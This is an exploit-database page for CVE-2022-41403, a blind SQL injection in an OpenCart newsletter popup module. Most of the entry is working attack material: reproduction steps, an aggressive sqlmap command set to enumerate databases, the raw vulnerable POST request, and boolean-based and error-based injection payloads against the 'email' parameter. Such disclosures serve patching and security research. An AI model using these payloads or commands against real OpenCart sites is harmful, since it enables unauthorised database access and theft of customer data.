---
title: OpenCart v3.x So Newsletter Custom Popup Module - Blind SQL Injection
url: https://cxsecurity.com/issue/WLB-2022100041
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-10-18
fetch_date: 2025-10-03T20:03:48.618034
---

# OpenCart v3.x So Newsletter Custom Popup Module - Blind SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **OpenCart v3.x So Newsletter Custom Popup Module - Blind SQL Injection** **2022.10.17**  **![sa](https://cert.cx/cxstatic/images/flags/sa.png) [Saud Alenazi](https://cxsecurity.com/author/Saud%2BAlenazi/1/) **(SA)** ![sa](https://cert.cx/cxstatic/images/flags/sa.png)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-41403](https://cxsecurity.com/cveshow/CVE-2022-41403/ "Click to see CVE-2022-41403")**  CWE: **N/A** | |

# Exploit Title: OpenCart v3.x So Newsletter Custom Popup Module - Blind SQL Injection
# Date: 16/10/2022
# Exploit Author: Saud Alenazi
# Vendor Homepage: https://www.opencart.com/
# Software Link: https://www.opencart.com/index.php?route=marketplace/extension/info&extension\_id=40259&filter\_search=newsletter&filter\_license=1&sort=date\_added
# Version: v.4.0
# Tested on: XAMPP, Linux
# Contact: https://twitter.com/dmaral3noz
# CVE: CVE-2022-41403
\* Description :
So Newsletter Custom Popup Module is compatible with any Opencart allows SQL Injection via parameter 'email' in index.php?route=extension/module/so\_newletter\_custom\_popup/newsletter.
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
\* Steps to Reproduce :
- Go to : http://127.0.0.1/index.php?route=extension/module/so\_newletter\_custom\_popup/newsletter or in index for Newsletter Email
- Save request in BurpSuite
- Run saved request with : sqlmap -r sql.txt -p email --random-agent --level=5 --risk=3 --time-sec=5 --hex --dbs
Request :
===========
POST /index.php?route=extension/module/so\_newletter\_custom\_popup/newsletter HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: OCSESSID=aaf920777d0aacdee96eb7eb50
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8
Accept-Encoding: gzip,deflate
Content-Length: 29
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:68.0) Gecko/20100101 Firefox/68.0
Connection: Keep-alive
createdate=2022-8-28%2019:4:6&email=hi&status=0
===========
Output :
Parameter: #1\* ((custom) POST)
Type: boolean-based blind
Title: AND boolean-based blind - WHERE or HAVING clause
Payload: createdate=2022-8-28 19:4:6&email=hi' AND 4805=4805-- nSeP&status=0
Type: error-based
Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
Payload: createdate=2022-8-28 19:4:6&email=hi' AND (SELECT 4828 FROM(SELECT COUNT(\*),CONCAT(0x7176627071,(SELECT (ELT(4828=4828,1))),0x7178786a71,FLOOR(RAND(0)\*2))x FROM INFORMATION\_SCHEMA.PLUGINS GROUP BY x)a)-- sRQS&status=0

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022100041)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top